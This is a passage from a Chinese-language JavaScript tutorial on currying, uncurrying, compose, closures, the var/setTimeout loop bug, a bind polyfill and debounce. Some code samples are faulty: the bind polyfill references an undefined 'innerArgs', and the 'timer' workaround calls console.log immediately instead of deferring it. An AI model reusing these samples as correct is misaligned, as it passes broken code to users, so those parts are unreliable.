    <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p><strong>其实 <code>bind</code> 方法就是一个柯里化转换函数</strong>，将调用 <code>bind</code> 方法的函数进行转换，即通过闭包返回一个柯里化函数，执行该柯里化函数的时候，借用 <code>apply</code> 将调用 <code>bind</code> 的函数的执行上下文转换成了 <code>context</code> 并执行，<strong>只是这个转换函数没有那么复杂，没有进行参数拆分，而是函数在调用的时候传入了所有的参数</strong>。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">simpleURL</span><span class="token punctuation">(</span><span class="token parameter">protocol<span class="token punctuation">,</span> domain<span class="token punctuation">,</span> path</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> protocol <span class="token operator">+</span> <span class="token string">&quot;://&quot;</span> <span class="token operator">+</span> domain <span class="token operator">+</span> <span class="token string">&quot;/&quot;</span> <span class="token operator">+</span> path<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> myURL <span class="token operator">=</span> <span class="token function">simpleURL</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">'http'</span><span class="token punctuation">,</span> <span class="token string">'www.bing.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">myURL</span><span class="token punctuation">(</span><span class="token string">'myfile.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//http://www.bing.com/myfile.js</span>
<span class="token comment">//站点加上SSL</span>
<span class="token keyword">var</span> mySslURL <span class="token operator">=</span> <span class="token function">simpleURL</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">'https'</span><span class="token punctuation">,</span> <span class="token string">'www.bing.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mySslURL</span><span class="token punctuation">(</span><span class="token string">'myfile.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//https://www.bing.com/myfile.js</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h5 id="反柯里化"><a href="#反柯里化" class="header-anchor">#</a> 反柯里化</h5> <blockquote><p>反柯里化的思想与柯里化正好相反，如果说<code>柯里化</code>的过程是<strong>将函数拆分成功能更具体化的函数</strong>，</p> <p>那<code>反柯里化</code>的作用则在于<strong>扩大函数的适用性，使本来作为特定对象所拥有的功能函数可以被任意对象所使用</strong>。</p></blockquote> <p>定义:  <code>obj.func(arg1, arg2)=&gt;func(obj, arg1, arg2)</code></p> <p><strong>代码实现</strong>: 函数跟参数分离开来；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// ES5 的实现</span>
<span class="token keyword">function</span> <span class="token function">uncurring</span><span class="token punctuation">(</span><span class="token parameter">fn</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 取出要执行fn方法的对象，同时从 arguments 中删除; </span>
        <span class="token keyword">return</span> <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// ES6 的实现</span>
<span class="token keyword">function</span> <span class="token function">uncurring</span><span class="token punctuation">(</span><span class="token parameter">fn</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>反柯里化还有另外一个应用，用来代替直接使用 call 和 apply，比如检测数据类型的 Object.prototype.toString 等方法，</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//以往我们使用时是在这个方法后面直接调用 call 更改上下文并传参，如果项目中多处需要对不同的数据类型进行验证是很麻的，常规的解决方案是封装成一个检测数据类型的模块。</span>
<span class="token comment">// 常规方案</span>
<span class="token keyword">function</span> <span class="token function">checkType2</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">uncurring</span><span class="token punctuation">(</span><span class="token parameter">fn</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// 利用反柯里化创建检测数据类型的函数</span>
<span class="token keyword">let</span> checkType <span class="token operator">=</span> <span class="token function">uncurring</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>toString<span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">checkType</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [object Number]</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">checkType</span><span class="token punctuation">(</span><span class="token string">&quot;hello&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [object String]</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">checkType</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [object Boolean]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><h5 id="compose函数"><a href="#compose函数" class="header-anchor">#</a> compose函数</h5> <p>简单的compose函数</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token function-variable function">compose</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">a <span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token parameter">c</span> <span class="token operator">=&gt;</span> <span class="token function">a</span><span class="token punctuation">(</span> <span class="token function">b</span><span class="token punctuation">(</span> c <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>例子：统计单词个数</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token function-variable function">space</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> <span class="token function-variable function">len</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> arr<span class="token punctuation">.</span>length

<span class="token comment">// 普通写法</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token function">space</span><span class="token punctuation">(</span><span class="token string">'i am samy'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 3</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token function">space</span><span class="token punctuation">(</span><span class="token string">'i am 23 year old'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 6</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token function">space</span><span class="token punctuation">(</span><span class="token string">'i am a author in juejin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 7</span>

<span class="token comment">// compose写法</span>
<span class="token keyword">const</span> <span class="token function-variable function">compose</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>fn</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token parameter">value</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> fn<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">value<span class="token punctuation">,</span> fn</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">fn</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token keyword">const</span> computedWord <span class="token operator">=</span> <span class="token function">compose</span><span class="token punctuation">(</span>space<span class="token punctuation">,</span> len<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">computedWord</span><span class="token punctuation">(</span><span class="token string">'i am samy'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 3</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">computedWord</span><span class="token punctuation">(</span><span class="token string">'i am 23 year old'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 6</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">computedWord</span><span class="token punctuation">(</span><span class="token string">'i am a author in juejin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 7</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h5 id="mul函数"><a href="#mul函数" class="header-anchor">#</a> MUL函数</h5> <p>MUL表示数的简单乘法。在这种技术中，<strong>将一个值作为参数传递给一个函数</strong>，而该函数将返回另一个函数，将第二个值传递给该函数，然后重复继续。例如:x<em>y</em>z可以表示为</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token function-variable function">mul</span> <span class="token operator">=</span> <span class="token parameter">x</span> <span class="token operator">=&gt;</span> <span class="token parameter">y</span> <span class="token operator">=&gt;</span> <span class="token parameter">z</span> <span class="token operator">=&gt;</span> x <span class="token operator">*</span> y <span class="token operator">*</span> z
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">mul</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 6</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h4 id="_8-闭包函数"><a href="#_8-闭包函数" class="header-anchor">#</a> 8:闭包函数</h4> <p>说到内嵌，其实就是父子引用关系(<strong>父函数包含子函数，子函数因为函数作用域又引用父函数, 所以叫闭包</strong>）</p> <p><strong>闭包</strong>  一句话可以概括：<strong>闭包就是能够读取其他函数内部变量的函数</strong>，或者子函数在外调用，子函数所在的父函数的作用域不会被释放。</p> <ul><li>优点：使外部能访问到局部的东西</li> <li>缺点：使用不当容易造成内存泄漏的问题</li></ul> <h5 id="作用-2"><a href="#作用-2" class="header-anchor">#</a> <strong>作用</strong></h5> <p>使用闭包可以访问函数中的变量。<strong>可以使变量长期保存在内存中，生命周期比较长</strong>。</p> <p>闭包不能滥用，否则会导致内存泄露，影响网页的性能。闭包使用完了后，<strong>要立即释放资源，将引用变量指向null。</strong></p> <h5 id="缺点"><a href="#缺点" class="header-anchor">#</a> <strong>缺点</strong></h5> <ol><li><strong>性能考量</strong>：闭包在处理速度和内存消耗方面对性能具有负面影响（多执行了一个函数，多了一个内存指向）</li> <li><strong>可能内存溢出</strong>。（比如：在闭包中的 <code>addEventListener</code> 没有被 <code>removeEventListener</code>）</li></ol> <h5 id="应用场景"><a href="#应用场景" class="header-anchor">#</a> 应用场景</h5> <ul><li><p>函数作为参数传递</p></li> <li><p>函数作为返回值</p></li> <li><p>通过闭包, 突破全局作用域链；迭代器中得应用;</p></li> <li><p><strong>使用传说中的设计模式 <code>单例模式</code></strong> ;</p></li></ul> <p>PS：还有一个优点：<code>_instance</code> 是私有的，外部不能更改（保证安全无污染/可信）</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> Singleton <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> _instance<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> _instance <span class="token operator">||</span> <span class="token punctuation">(</span>_instance <span class="token operator">=</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">{</span>x<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">{</span>y<span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a <span class="token operator">===</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><ul><li><strong>解决 <code>var</code> 在 <code>for</code> + <code>setTimeout</code> 混合场景中的BUG</strong></li></ul> <p>因为 <strong>var 是函数作用域</strong>（原因1），而 <strong>setTimeout 是异步执行</strong>（原因2），所以：当 console.log 执行的时候 i 已经等于 6 了（BUG产生）【有个要点，也回答上】</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span><span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> i<span class="token operator">*</span><span class="token number">300</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token comment">//6 6 6 6 6  </span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>在没有 <code>let</code> 和 <code>const</code> 的年代，常用的解决方式就是闭包</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">j</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> j<span class="token operator">*</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p><strong>其他方案</strong></p> <p><strong>拆分结构</strong>：还可以将setTimeout的定义和调用分别放到不同部分</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>function timer(i) {
    setTimeout( console.log( i ), i*1000 );
}
for (var i=1; i&lt;=5;i++) {
    timer(i);
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p><strong>let</strong>：<strong>使用es6的let来解决此问题</strong>；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span><span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span> <span class="token keyword">function</span> <span class="token function">timer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> i <span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span><span class="token punctuation">,</span> i<span class="token operator">*</span><span class="token number">1000</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>这个例子与第一个相比，只是把var更改成了let，可是控制台的结果却是依次输出1到5。</p> <p>因为for循环头部的let不仅将i绑定到for循环中，事实上它将其重新绑定到循环体的每一次迭代中，确保上一次迭代结束的值重新被赋值。setTimeout里面的function()属于一个新的域，通过var定义的变量是无法传入到这个函数执行域中的，<strong>通过使用let来声明块变量能作用于这个块，所以function就能使用i这个变量了</strong>；这个匿名函数的参数作用域和for参数的作用域不一样，是利用了这一点来完成的。这个匿名函数的作用域有点类似类的属性，是可以被内层方法使用的。</p> <p><strong>setTimeout第三个参数</strong>: 第三个可选参数；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span><span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span> <span class="token keyword">function</span> <span class="token function">timer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> i <span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span><span class="token punctuation">,</span> i<span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">,</span> i <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>这当然还是作用域的问题，但是在这里setTimeout第三个参数却把i的值给保存了下来。这种解决方法比使用闭包轻快的多。</p> <ul><li><strong>bind函数的类似实现原理</strong></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>bind<span class="token operator">===</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//**bind函数的实现原理**，如果浏览器不支持bind属性</span>
  <span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">bind</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span>obj<span class="token comment">/*，参数列表*/</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> fun<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">;</span><span class="token comment">//留住this; //args保存的就是提前绑定的参数列表</span>
    <span class="token keyword">var</span> args<span class="token operator">=</span><span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将类数组对象，转化为普通数组</span>
    <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token keyword">var</span> allArgs<span class="token operator">=</span>args<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>innerArgs<span class="token punctuation">)</span><span class="token comment">//将之前绑定的参数值和新传入的参数值，拼接为完整参数之列表</span>
      <span class="token function">fun</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span>allArgs<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用原始函数fun，替换this为obj，传入所有参数</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><ul><li><p><strong>节流及防抖的使用</strong></p></li> <li><p>其他</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">ones</span><span class="token punctuation">(</span><span class="token parameter">func</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//实现一个once函数，传入函数参数只执行一次</span>
    <span class="token keyword">var</span> tag<span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span>tag<span class="token operator">==</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">func</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span>arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>
        tag<span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">return</span> <span class="token keyword">undefined</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div></li></ul> <h5 id="防抖和节流函数【要点】"><a href="#防抖和节流函数【要点】" class="header-anchor">#</a> 防抖和节流函数【要点】</h5> <p>定义及比较及应用</p> <table><thead><tr><th style="text-align:left;">类型</th> <th>概念</th> <th>应用</th></tr></thead> <tbody><tr><td style="text-align:left;">防抖(debounce)</td> <td>事件触发动作完成后一段时间触发一次</td> <td>scroll,resize事件触发完后一段时间触发；1、电脑息屏时间，每动一次电脑又重新计算时间 2、input框变化频繁触发事件可加防抖 3、频繁点击按钮提交表单可加防抖</td></tr> <tr><td style="text-align:left;">节流(throttle)</td> <td>事件触发后每隔一段时间触发一次,可触发多次</td> <td>scroll,resize事件一段时间触发多次；1、滚动频繁请求列表可加节流 2、游戏里长按鼠标，但是动作都是每隔一段时间做一次</td></tr></tbody></table> <p><strong>函数节流和防抖都是「闭包」、「高阶函数」的应用</strong></p> <p><img src="/rat-summ/assets/img/02-01-12.baee74b4.jpg" alt="img"></p> <h6 id="防抖实现【dc】"><a href="#防抖实现【dc】" class="header-anchor">#</a> 防抖实现【DC】</h6> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//函数防抖debounce指的是某个函数在某段时间内，无论触发了多少次回调，都只执行最后一次</span>
  <span class="token keyword">let</span> <span class="token function-variable function">debounce</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span> wait</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> timeout <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//return (...args) =&gt; {</span>
